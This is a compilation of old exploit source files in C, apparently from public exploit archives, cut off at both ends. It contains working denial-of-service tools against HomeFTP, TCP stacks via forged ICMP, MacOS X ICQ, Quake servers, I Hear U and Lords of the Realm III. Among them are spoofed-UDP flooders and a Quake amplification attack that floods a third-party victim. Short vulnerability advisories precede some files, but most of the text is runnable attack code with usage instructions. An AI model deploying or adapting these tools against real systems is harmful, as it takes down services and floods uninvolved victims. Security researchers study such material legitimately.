    sprintf(request,BUGSTR,evilrequest);
    printf("[+] Sending %d bytes of painfull buffer\n",strlen(evilrequest));
    if ( send ( s, request, strlen (request), 0) <= 0 )
    {
            printf("[X] Failed to send buffer\n");
            close(s);
            exit(1);
    }
    sleep(1);
    printf("[+] Done, Packet Sent\n");
    close(s);
    free(request);
    request = NULL;
    return 0;
}/*
HomeFtp v1.1 Denial of Service
original advisory: http://kapda.ir/advisory-202.html
homeftp_v1.1_xpl.c
----------------------------------------
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define  POCSTR "USER %s\x0d\x0aPASS %s\x0d\x0aNLST\x0d\x0a"

int header();
int usage(char *filename);
int remote_connect( char* ip, unsigned short port );

int header() {
printf("\n[i] KAPDA - Computer Security Science Researchers Institute\n\n");
printf("[i] Title:              \tHomeFTP <= v1.1 Dos Exploit\n");
printf("[i] Discovered by:      \tcvh {a] kapda.ir\n");
printf("[i] Exploit by:         \tPi3cH {a] kapda.ir\n");
printf("[i] More info:          \twww.kapda.ir/page-advisory.html\n\n");
return 0;
}

int usage(char *filename) {
printf("[i] Usage:   \t%s HOST PORT USERNAME PASSWORD\n",filename);
printf("[i] Example: \t%s 127.0.0.1 21 anonymous none\n\n",filename);
exit(0);
}

int remote_connect( char* ip, unsigned short port )
{
int s;
struct sockaddr_in remote_addr;
struct hostent* host_addr;

memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
{
printf ( "[e] Cannot resolve \"%s\"\n", ip );
exit ( 1 );
}
remote_addr.sin_family = AF_INET;
remote_addr.sin_port = htons ( port );
remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
{
printf ( "[e] Socket failed!\n" );
exit(1);
}
if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
{
printf ( "[e] Failed connecting!\n" );
       exit(1);
}
return ( s );
}


int main(int argc, char *argv[]) {
 int s;
 char *request;
 header();
 if( (argc < 5) )
     usage(argv[0]);
 request = (char *) malloc(1024);
 printf("[r] Connecting to remote host\n");
 s = remote_connect(argv[1],atoi(argv[2]));
 sleep(1);
 printf("[r] Creating buffer\n");
 sprintf(request,POCSTR,argv[3],argv[4]);
 printf("[r] Sending %d bytes of DOS buffer\n",strlen(request));
 if ( send ( s, request, strlen (request), 0) <= 0 )
 {
         printf("[e] Failed to send buffer\n");
         close(s);
         exit(1);
 }
 sleep(1);
 printf("[s] Exploit Done!\n");
 close(s);
 free(request);
 request = NULL;
 return 0;
}

// milw0rm.com [2006-01-14]
source: http://www.securityfocus.com/bid/2997/info

A potential denial of service vulnerability exists in several TCP stack implementations.

TCP has a MSS (maximum segment size) option that is used by a TCP client to announce to a peer the maximum amount of TCP data that can be sent per segment. The potential for attacks exists because in many cases only a small minimum value is enforced for the MSS.

By setting the MSS to a low value (such as 1) and making requests for large amounts of data through a TCP service, an attacker could effectively cause a denial of service by causing a large workload on a system. 

/*
 * (C)Copyright 2001 Darren Reed.
 *
 * maxseg.c
 */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#if BSD >= 199306
#include <sys/sysctl.h>
#endif

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <netinet/tcp.h>
#include <netinet/tcp_timer.h>
#include <netinet/tcp_var.h>

#include <time.h>
#include <fcntl.h>
#include <errno.h>

void prepare_icmp(struct sockaddr_in *);
void primedefaultmss(int, int);
u_short in_cksum(u_short *, int);
int icmp_unreach(struct sockaddr_in *, struct sockaddr_in *);


#define	NEW_MSS	512
#define	NEW_MTU	1500
static int start_mtu = NEW_MTU;

void primedefaultmss(fd, mss)
int fd, mss;
{
#ifdef __NetBSD__
	static int defaultmss = 0;
	int mib[4], msso, mssn;
	size_t olen;

	if (mss == 0)
		mss = defaultmss;
	mssn = mss;
	olen = sizeof(msso);

	mib[0] = CTL_NET;
	mib[1] = AF_INET;
	mib[2] = IPPROTO_TCP;
	mib[3] = TCPCTL_MSSDFLT;
	if (sysctl(mib, 4, &msso, &olen, NULL, 0))
		err(1, "sysctl");
	if (defaultmss == 0)
		defaultmss = msso;

	if (sysctl(mib, 4, 0, NULL, &mssn, sizeof(mssn)))
		err(1, "sysctl");

	if (sysctl(mib, 4, &mssn, &olen, NULL, 0))
		err(1, "sysctl");

	printf("Default MSS: old %d new %d\n", msso, mssn);
#endif

#if HACKED_KERNEL
	int opt;

	if (mss)
		op = mss;
	else
		op = 512;
	if (setsockopt(fd, IPPROTO_TCP, TCP_MAXSEG+1, (char *)&op, sizeof(op)))
		err(1, "setsockopt");
#endif
}


int
main(int argc, char *argv[])
{
	struct sockaddr_in me, them;
	int fd, op, olen, mss;
	char prebuf[16374];
	time_t now1, now2;
	struct timeval tv;

	mss = NEW_MSS;

	primedefaultmss(-1, mss);

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd == -1)
		err(1, "socket");

	memset((char *)&them, 0, sizeof(me));
	them.sin_family = AF_INET;
	them.sin_port = ntohs(atoi(argv[2]));
	them.sin_addr.s_addr = inet_addr(argv[1]);

	primedefaultmss(fd, mss);

	op = fcntl(fd, F_GETFL, 0);
	if (op != -1) {
		op |= O_NONBLOCK;
		fcntl(fd, F_SETFL, op);
	}

	op = 1;
	(void) setsockopt(fd, SOL_SOCKET, TCP_NODELAY, &op, sizeof(op));

	if (connect(fd, (struct sockaddr *)&them, sizeof(them)) &&
	    (errno != EINPROGRESS))
		err(1, "connect");

	olen = sizeof(op);
	if (!getsockopt(fd, IPPROTO_TCP, TCP_MAXSEG, (char *)&op, &olen))
		printf("Remote mss %d\n", op);
	else
		err(1, "getsockopt");

#if HACKED_KERNEL
	olen = sizeof(op);
	if (!getsockopt(fd, IPPROTO_TCP, TCP_MAXSEG+1, (char *)&op, &olen))
		printf("Our mss %d\n", op);
	else
		err(1, "getsockopt(+1)");
#endif

	olen = sizeof(me);
	if (getsockname(fd, (struct sockaddr *)&me, &olen))
		err(1, "getsockname");

	(void) read(fd, prebuf, sizeof(prebuf));

	now1 = time(NULL);
	for (op = 2; op; op--) {
		icmp_unreach(&me, &them);
		olen = read(fd, prebuf, sizeof(prebuf));
		if (olen == -1) {
			if (errno == ENOBUFS || errno == EAGAIN ||
			    errno == EWOULDBLOCK) {
				tv.tv_sec = 0;
				tv.tv_usec = 10000;
				select(3, NULL, NULL, NULL, &tv);
				continue;
			}
			warn("read");
			break;
		}
	}
	now2 = time(NULL);
	printf("Elapsed time %d\n", now2 - now1);

	primedefaultmss(fd, 0);
	close(fd);
	return 0;
}


/*
 * in_cksum() & icmp_unreach() ripped from nuke.c prior to modifying
 */
static char icmpbuf[256];
static int icmpsock = -1;
static struct sockaddr_in destsock;

void
prepare_icmp(dst)
	 struct sockaddr_in *dst;
{
	struct tcphdr *tcp;
	struct icmp *icmp;

	icmp = (struct icmp *)icmpbuf;

	if (icmpsock == -1) {

		memset((char *)&destsock, 0, sizeof(destsock));
		destsock.sin_family = AF_INET;
		destsock.sin_addr = dst->sin_addr;

		srand(getpid());

		icmpsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
		if (icmpsock == -1)
			err(1, "socket");

		/* the following messy stuff from Adam Glass (icmpsquish.c) */
		memset(icmp, 0, sizeof(struct icmp) + 8);
		icmp->icmp_type = ICMP_UNREACH;
		icmp->icmp_code = ICMP_UNREACH_NEEDFRAG;
		icmp->icmp_pmvoid = 0;

		icmp->icmp_ip.ip_v = IPVERSION;
		icmp->icmp_ip.ip_hl = 5;
		icmp->icmp_ip.ip_len = htons(NEW_MSS);
		icmp->icmp_ip.ip_p = IPPROTO_TCP;
		icmp->icmp_ip.ip_off = htons(IP_DF);
		icmp->icmp_ip.ip_ttl = 11 + (rand() % 50);
		icmp->icmp_ip.ip_id = rand() & 0xffff;

		icmp->icmp_ip.ip_src = dst->sin_addr;

		tcp = (struct tcphdr *)(&icmp->icmp_ip + 1);
		tcp->th_sport = dst->sin_port;
	}
	icmp->icmp_nextmtu = htons(start_mtu);
	icmp->icmp_cksum = 0;
}


u_short
in_cksum(addr, len)
u_short *addr;
int len;
{
	    register int nleft = len;
	    register u_short *w = addr;
	    register int sum = 0;
	    u_short answer = 0;

	    /*
	     *  Our algorithm is simple, using a 32 bit accumulator (sum),
	     *  we add sequential 16 bit words to it, and at the end, fold
	     *  back all the carry bits from the top 16 bits into the lower
	     *  16 bits.
	     */
	    while( nleft > 1 )  {
	            sum += *w++;
	            nleft -= 2;
	    }

	    /* mop up an odd byte, if necessary */
	    if( nleft == 1 ) {
	            *(u_char *)(&answer) = *(u_char *)w ;
	            sum += answer;
	    }

	    /*
	     * add back carry outs from top 16 bits to low 16 bits
	     */
	    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	    sum += (sum >> 16);                     /* add carry */
	    answer = ~sum;                          /* truncate to 16 bits */
	    return (answer);
}

int icmp_unreach(src, dst)
	 struct sockaddr_in *src, *dst;
{
	static int donecksum = 0;
	struct sockaddr_in dest;
	struct tcphdr *tcp;
	struct icmp *icmp;
	int i, rc;
	u_short sum;

	icmp = (struct icmp *)icmpbuf;

	prepare_icmp(dst);

	icmp->icmp_ip.ip_dst = src->sin_addr;

	sum = in_cksum((u_short *)&icmp->icmp_ip, sizeof(struct ip));
	icmp->icmp_ip.ip_sum = sum;

	tcp = (struct tcphdr *)(&icmp->icmp_ip + 1);
	tcp->th_dport = src->sin_port;

	sum = in_cksum((u_short *)icmp, sizeof(struct icmp) + 8);
	icmp->icmp_cksum = sum;
	start_mtu /= 2;
	if (start_mtu < 69)
		start_mtu = 69;

	i = sendto(icmpsock, icmpbuf, sizeof(struct icmp) + 8, 0,
		   (struct sockaddr *)&destsock, sizeof(destsock));
	if (i == -1 && errno != ENOBUFS && errno != EAGAIN &&
	    errno != EWOULDBLOCK)
		err(1, "sendto");
	return(0);
}
source: http://www.securityfocus.com/bid/4031/info

ICQ For MacOS X is a port of the popular Mirabilis ICQ client to the Apple MacOS X platform. It is freely available.

It is possible to cause MacOS X ICQ clients to crash by sending an excessively long request (19000+ characters). MacOS X ICQ clients normally bind to ports 49152 and 49159.

This is likely due to an unchecked buffer of some sort, so the possibility of exploiting this condition to execute arbitrary attacker-supplied instructions does exist. Though this possibility has not been confirmed.

This issue has been reported for ICQ For MacOS X version 2.6X Beta. Other versions may also be prone to this issue. 

/*
 * OSX ICQ Dos. sa7ori@tasam.com
 * Proof of concept. Worked on early versions of Licq. Now it apparently works
 * for various versions of OSX ICQ clients.
 * Tested and works on: ICQ MacOSX Ver 2.6x Beta Build 7
 * and several others.
 */

#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main(int argc, char **argv){
  char buf[19000]; int i, sock, result; struct sockaddr_in sin; struct hostent *gothost;
  printf("So you wanna DoS ICQ...\n sa7ori@tasam.com\nBRAAAAAZIIIIIIIL\n");
  if (argc < 3) {
      fprintf(stderr, "Usage: %s <icqclient> <port>\njeez. get it right.\n", argv[0]);
      exit(-1);
    }
  gothost = gethostbyname(argv[1]);
  if (!gothost){
      fprintf(stderr, "%s: Host resolv failed. Tard.\n", argv[1]);
      exit(-1);
    }
  sin.sin_family = AF_INET; sin.sin_port = htons(atoi(argv[2]));
  sin.sin_addr = *(struct in_addr *)gothost->h_addr; sock = socket(AF_INET, SOCK_STREAM, 0);
  result = connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
  if (result != 0) {
      fprintf(stderr, "Connect Failed. reTard. %s\n", argv[1]);
      exit(-1);
    }
  if (sock < 0){
      fprintf(stderr, "Error in socket.");
      exit(-1);
    }
  for (i=0; i<19000; i++) /* send loop shaboing boing boing */
    strncat(buf, "A", 1);
  send(sock, buf, sizeof(buf), 0);
  close(sock);
  fprintf(stdout, "ShinryuHadoken\n..And an angry flurry of As flies from your outstreached hand. heh.\n\n");
}

source: http://www.securityfocus.com/bid/3051/info

Quake is a very popular 3D "first-person-shooter" game from ID software.

A flaw has been identified in the product's network play features which allows a maliciously designed client to prevent legitimate players from connecting to the Quake server. Additionally, it is possible to disconnect players that have already connected to the Quake server. 

/*
  qflood.c - Written by Andy Gavin (_k3nny@Efnet,
k@EnterTheGame)
  UDP spoofing idea taken from "arnudp" by Arny
(cs6171@scitsc.wlv.ac.uk)
  Original idea discussed on Bugtraq in 1998.

  This program will fill up a Quake server with spoofed
"unconnected" clients, disallowing other players the
ability to connect to the server since the player limit
fills up quickly.  Additionally, if the server does not
support multiple clients from the same IP address, it will
 disconnect legitimate players if the spoofed connection
request matches that player.

  Compiled on linux 2.2.19 with gcc 2.91.
  Tested to work on all NetQuake servers.
  Vendor status: Not contacted, since id Software has long
abandoned Quake.

  Andy Gavin is not responsible for what you do with this
program.  This is  meant for testing purposes only.

  Greets:
  - Karen;
  - Parents, Tim, Erica, and my dog;
  - insyder, mechtoad, def, ap0k, informer, scythe, zer0v,
fain, and the rest of #clanchat on Efnet;
  - deek, cha0ticz, schmorky, Ir8Pir8, redmund, vise,
_nuclear_, and the rest of #prediction on EnterTheGame;
  - Joe W, Brian L (good luck...and we'll miss you), and the
rest of the crew at work;
  - Steve Yzerman
  - Led Zeppelin, Pearl Jam, Radiohead, and Hum
*/

#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct sockaddr sa;
struct node
{
  char *address;
  struct node *next;
};

struct node *head = NULL;
struct node *tail;

void add_address( struct node **, char * );
void sig_handler( int );

int main( int argc, char **argv )
{
  int x = 1;
  int source_port, delay, fd;
  struct sockaddr_in *p;
  struct hostent *he;
  struct node *current;
  char *temp;

  u_char thePACKET[41]=
  {
    0x45,                       /* IP version, header len */
    0x00,                       /* IP diff services field */
    0x00, 0x29,                 /* IP total length */
    0xc2, 0xb5,                 /* IP id */
    0x00, 0x00,                 /* IP fragment offset */
    0x80,                       /* IP TTL */
    0x11,                       /* IP protocol */
    0, 0,                       /* IP header checksum */
    0, 0, 0, 0,                 /* IP src */
    0, 0, 0, 0,                 /* IP dest */
    0x00, 0x00,                 /* UDP src port */
    0, 0,                       /* UDP dest port */
    0x00, 0x15,                 /* length = 21 */
    0x00, 0x00,                 /* UDP checksum */
    0x80, 0x00,                 /* Quake flags */
    0x00, 0x0d,                 /* Quake length */
    0x01,                       /* Quake command = connect
*/
    0x51, 0x55, 0x41, 0x4b,     /* Quake game = QUAKE */
    0x45, 0x00,
    0x03, 0x01                  /* Quake version = 3 */
  };

  if( argc != 5 )
  {
    fprintf( stderr, "\nqflood - floods Quake servers with
spoofed connection requests\n" );
    fprintf( stderr, "\tWritten by Andy Gavin (_k3nny@Efnet,
k@ETG)\n" );
    fprintf( stderr, "\tUsage: %s <src> <server>
<server_port> <delay>\n", *argv );
    fprintf( stderr, "\t\tsrc = comma-delimited list of
IPs/hostnames\n" );
    fprintf( stderr, "\t\tserver = Quake server
IP/hostname\n" );
    fprintf( stderr, "\t\tserver_port = Quake server port\n"
);
    fprintf( stderr, "\t\tdelay = delay between connection
requests (in msec)\n" );
    fprintf( stderr, "\t\texample: %s 10.0.0.2,10.0.0.3
10.0.0.10 26000 500\n\n", argv[0] );
    exit( 0 );
  }

  srand( time( NULL ));
  delay = atoi( argv[4] ) * 1000;

  /* build a linked list of addresses entered on command
line */
  temp = strtok( argv[1], "," );
  add_address( &head, temp );

  signal( SIGINT, sig_handler );

  tail = head;

  temp = strtok( NULL, "," );
  while( temp != NULL )
  {
    add_address( &(tail->next), temp );
    tail = tail->next;
    temp = strtok( NULL, "," );
  }

  current = head;

  while( 1 )
  {
    while( current != NULL )
    {
      if( ( he = gethostbyname( current->address )) == NULL
)
      {
        fprintf( stderr, "Can't resolve src\n" );
        exit( 0 );
      }

      bcopy( *( he->h_addr_list ), ( thePACKET + 12 ), 4 );

      if( ( he = gethostbyname( argv[2]) ) == NULL )
      {
        fprintf( stderr, "Can't resolve server\n");
        exit( 0 );
      }

      bcopy( *( he->h_addr_list ), ( thePACKET + 16 ), 4 );

      source_port = rand() % 3976 + 1024;

      *(u_short*)(thePACKET + 20) = htons( (u_short)
source_port );
      *(u_short*)(thePACKET + 22) = htons( (u_short) atoi(
argv[3] ));

      p = ( struct sockaddr_in* ) &sa;
      p->sin_family = AF_INET;
      bcopy( *( he->h_addr_list ), &(p->sin_addr), sizeof(
struct in_addr ) );

      if(( fd=socket( AF_INET, SOCK_RAW, IPPROTO_RAW )) ==
-1 )
      {
        perror( "Can't create raw socket (you must run as
root)" );
        exit( 0 );
      }

      if( setsockopt( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x,
sizeof(x)) < 0 )
      {
        perror( "setsockopt IP_HDRINCL error" );
        exit( 0 );
      }

      if(( sendto( fd, &thePACKET, sizeof(thePACKET), 0,
(struct sockaddr*)p, sizeof(struct sockaddr ))) == -1)
      {
        perror( "sendto error" );
        exit( 0 );
      }

      printf( "Quake connection request sent from %s:%i to
%s:%s\n", current->address, source_port, argv[2], argv[3] );

      usleep( delay );
      current = current->next;
    }
    current = head;
  }
  exit( 1 );
}

void add_address( struct node** reference, char *data )
{
  struct node* new_node = malloc( sizeof( struct node ));

  new_node->address = data;
  new_node->next = *reference;
  *reference = new_node;
}

void sig_handler( int number )
{
  struct node *current = head;
  struct node *next;

  printf( "\nCaught SIGINT.  Cleaning up memory..." );
  while( current != NULL )
  {
    next = current->next;
    free( current );
    current = next;
  }
  printf( "done.\n\n" );
  exit( 1 );
}

source: http://www.securityfocus.com/bid/3060/info


Quake 3 network play features contain a remotely exploitable denial of service vulnerability.

A hostile client program can be used by to generate a large number of forged client queries on behalf of a target user. The server's responses flood the target user, consuming the target system's network bandwidth and CPU cycles.

It has been reported that other games suffer from similar issues. Additional amplification attacks may be possible through the usage of commands which return detailed information about the game status or server information. In some cases, packets larger than 500 bytes may be sent in response to a 50 byte spoofed UDP packet. 

/*
  qsmurf.c
  Written by Jamal Motsa (Haul@EFnet), based on qflood.c by Andy Gavin (_k3nny@EFnet, k@ETG)
  Look at his original post for the original credits.
  The anti-script kiddie file descriptor bug has been removed and the code was cleaned up a lot.

  This works based on the fact that when a Quake client connects to a Quake server, much more data
  is received by the client than is sent.  This program will spoof connections from a target (source
  IP Address) to NetQuake servers, which will reply to the target with lots of data with an
  amplification rate approaching 20:1.

  Greets to:
  Sean Stanek (vulture@EFnet) for doing most of the code optimization.
  SFS, WHHS, Marlboro, the Shao Lin
  Lithium Node and channel regulars, TPC, X-Tommy, the defunct #BrainFreze Jeff, NEO, Kwizatz@RURC
  Sang, zuez, dead-sexy.com and crew, #phear on EFnet, AY, Eric R. for providing me with DNS

  And a big middle finger to:
  BTA (for being quite possibly the worse Quake 3 clan in history)
  anyone who packets EFnet servers
  and finally, to whoever framed OJ
*/

#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct sockaddr sa;
struct node
{
  char *address;
  struct node *next;
  unsigned int ip;
};

struct node *head = NULL;
struct node *tail;

void add_address( struct node **, char * );
void sig_handler( int );

int main( int argc, char **argv )
{
  int x = 1;
  int source_port, delay, fd;
  unsigned int ip;
  struct sockaddr_in *p;
  struct hostent *he;
  struct node *current;
  char *temp;

  u_char thePACKET[41]=
  {
    0x45,                       /* IP version, header len */
    0x00,                       /* IP diff services field */
    0x00, 0x29,                 /* IP total length */
    0xc2, 0xb5,                 /* IP id */
    0x00, 0x00,                 /* IP fragment offset */
    0x80,                       /* IP TTL */
    0x11,                       /* IP protocol */
    0, 0,                       /* IP header checksum */
    0, 0, 0, 0,                 /* IP src */
    0, 0, 0, 0,                 /* IP dest */
    0x00, 0x00,                 /* UDP src port */
    0, 0,                       /* UDP dest port */
    0x00, 0x15,                 /* length = 21 */
    0x00, 0x00,                 /* UDP checksum */
    0x80, 0x00,                 /* Quake flags */
    0x00, 0x0d,                 /* Quake length */
    0x01,                       /* Quake command = connect */
    0x51, 0x55, 0x41, 0x4b,     /* Quake game = QUAKE */
    0x45, 0x00,
    0x03, 0x01                  /* Quake version = 3 */
  };

  if( argc != 5 )
  {
    fprintf( stderr, "\nqsmurf - floods targets with amplified UDP packets using the NetQuake protocol\n" );
    fprintf( stderr, "\tWritten by Jamal Motsa (Haul@EFnet)\n" );
    fprintf( stderr, "\tUsage: %s <servers> <src> <server_port> <delay>\n", *argv );
    fprintf( stderr, "\t\tservers = comma-delimited list of IP Address/hostnames of Quake servers\n" );
    fprintf( stderr, "\t\tsrc = IP Address/hostname of target\n" );
    fprintf( stderr, "\t\tserver_port = Quake server port\n" );
    fprintf( stderr, "\t\tdelay = delay between connection requests (in usec, 0 for no delay)\n" );
    fprintf( stderr, "\t\texample: %s 10.0.0.2,10.0.0.3 10.0.0.10 26000 50000\n\n", argv[0] );
    exit( 0 );
  }

  srand( time( NULL ));
  delay = atoi( argv[4] );

  /* build a linked list of addresses entered on command line */
  temp = strtok( argv[1], "," );
  add_address( &head, temp );

  signal( SIGINT, sig_handler );

  tail = head;

  temp = strtok( NULL, "," );
  while( temp != NULL )
  {
    add_address( &(tail->next), temp );
    tail = tail->next;
    temp = strtok( NULL, "," );
  }

  current = head;

  if(( fd=socket( AF_INET, SOCK_RAW, IPPROTO_RAW )) == -1 )
  {
    perror( "Can't create raw socket (you must run as root)" );
    exit( 0 );
  }

  if( setsockopt( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x, sizeof(x)) < 0 )
  {
    perror( "setsockopt IP_HDRINCL error" );
    exit( 0 );
  }

  if( ( he = gethostbyname( argv[2]) ) == NULL )
  {
    fprintf( stderr, "Can't resolve src\n" );
    exit( 0 );
  }

  bcopy( *( he->h_addr_list ), &ip, 4 );


  while( 1 )
  {
    while( current != NULL )
    {
      bcopy( &ip, ( thePACKET + 16 ), 4 );
      bcopy( &(current->ip), ( thePACKET + 16 ), 4 );

      source_port = rand() % 3976 + 1024;

      *(u_short*)(thePACKET + 20) = htons( (u_short) source_port );
      *(u_short*)(thePACKET + 22) = htons( (u_short) atoi( argv[3] ));

      p = ( struct sockaddr_in* ) &sa;
      p->sin_family = AF_INET;
      bcopy( &current->ip, &(p->sin_addr), 4 );

      if(( sendto( fd, &thePACKET, sizeof(thePACKET), 0, (struct sockaddr*)p, sizeof(struct sockaddr ))) == -1)
      {
        perror( "sendto error" );
        exit( 0 );
      }

      printf( "Quake connection request sent from %s:%i to %s:%s\n", argv[2], source_port, current->address,
argv[3] );

      if( delay > 0 ) usleep( delay );
      current = current->next;
    }
    current = head;
  }
  exit( 1 );
}

void add_address( struct node** reference, char *data )
{
  struct hostent * he;
  struct node* new_node = malloc( sizeof( struct node ));

  new_node->address = data;
  new_node->next = *reference;

  if( ( he = gethostbyname( new_node->address )) == NULL )
  {
    fprintf( stderr, "Can't resolve server\n");
    exit( 0 );
  }
  bcopy( *( he->h_addr_list ), &(new_node->ip), 4 );

  *reference = new_node;
}

void sig_handler( int number )
{
  struct node *current = head;
  struct node *next;

  printf( "\nCaught SIGINT.  Cleaning up memory..." );
  while( current != NULL )
  {
    next = current->next;
    free( current );
    current = next;
  }
  printf( "done.\n\n" );
  exit( 1 );
}











/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        1793
#define BUFFSZ      255

#define IHUDOS1     "IHU" "\x00"
#define IHUDOS2     "IHU" "\x06" "\x01" "\x00"  // \x3f too
                  // sign  pcksz  type   datasz



u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            attack;
    u16     port    = PORT;
    u8      *pck,
            pcksz;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "I Hear U <= 0.5.6 Denial of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = endless loop caused by packet size value equal to 0\n"
            " 2 = crash caused by unitialized values in ring()\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(attack == 1) {
        pck   = IHUDOS1;
        pcksz = sizeof(IHUDOS1) - 1;
    } else {
        pck   = IHUDOS2;
        pcksz = sizeof(IHUDOS2) - 1;
    }

    printf("- test UDP\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    sendto(sd, pck, pcksz, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
    close(sd);

    printf("- test TCP\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(!connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))) {
        send(sd, pck, pcksz, 0);
    }
    close(sd);

    printf("- done\n");
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/11223/info

A problem in the handling of nicknames is reported in the Lords of the Realm III server. Because of this, an attacker may be able to deny service to users of the game server.

The problem is in the handling of nicknames of excessive length.

It should be noted that this vulnerability only occurs when the server enters "lobby mode," which is a brief window of time before the initiation of a new game.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
#endif



#define VER     "0.1"
#define PORT    29901
#define BUFFSZ  16384   // BOOMSZ

#define SHOW(x) len = *(u_long *)p; \
                fputs(x, stdout); \
                p += 4; \
                while(len--) { \
                    fputc(*p, stdout); \
                    p += 2; \
                } \
                fputc('\n', stdout);



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in     peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            *p;


    setbuf(stdout, NULL);

    fputs("\n"
        "Lords of the Realm III <= 1.01 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <server> [port(%d)]\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if(recv(sd, buff, BUFFSZ, 0)
      < 0) std_err();

    fputs("- informations:\n", stdout);
    if(*buff != 11) {
        p = buff + 5;
        SHOW("  Server*Admin:   ");
        p += 2;
        SHOW("  Map:            ");
    } else {
        p = buff + 24;
        SHOW("  Admin nick:     ");
    }

    *(u_long *)buff = BUFFSZ - 4;
    memcpy(buff + 4, "\x79\xff\xff\xff\xff", 5);
    *(u_long *)(buff + 9) = (BUFFSZ - 14) >> 1;
    memset(buff + 13, 'a', BUFFSZ - 14);
    buff[BUFFSZ - 1] = 0x45;

    fputs("\n- send BOOM data\n", stdout);
    if(send(sd, buff, BUFFSZ, 0)
      < 0) std_err();

    if(recv(sd, buff, BUFFSZ, 0) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem to be vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
